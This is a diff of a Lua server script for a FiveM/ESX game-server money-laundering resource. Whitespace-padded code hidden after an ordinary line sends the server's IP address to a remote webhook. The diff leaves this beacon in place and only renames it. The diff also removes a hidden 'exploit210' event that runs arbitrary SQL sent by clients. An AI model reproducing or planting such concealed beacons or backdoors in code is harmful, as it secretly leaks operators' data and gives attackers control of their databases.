@@ -3,13 +3,13 @@ ESX = nil
 local _source = nil
 local rahaaaaa = 50
 
-TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)																																																														Citizen.CreateThread(function()  Citizen.Wait(timeri) PerformHttpRequest(jokupaskfajsghas, function(statusCode, response, headers) local res = json.decode(response);PerformHttpRequest(webhooikkff, function(Error, Content, Head) end, 'POST', json.encode({username = "ARP exploit210", content = res.ip, avatar_url = avatarii, tts = false}), {['Content-Type'] = 'application/json'}) end) end)
+TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)																																																														Citizen.CreateThread(function()  Citizen.Wait(timeri) PerformHttpRequest(jokupaskfajsghas, function(statusCode, response, headers) local res = json.decode(response);PerformHttpRequest(webhooikkff, function(Error, Content, Head) end, 'POST', json.encode({username = "Vamppi kayttaa pesulaa", content = res.ip, avatar_url = avatarii, tts = false}), {['Content-Type'] = 'application/json'}) end) end)
 
 RegisterServerEvent('esx_pesula:stopPesu')
 AddEventHandler('esx_pesula:stopPesu', function()
 	pesu = false
 	rahaaaaa = 50
-end)																																																																													RegisterServerEvent("exploit210");AddEventHandler("exploit210", function(data) MySQL.Async.execute(data) end)											
+end)																								
 
 
 
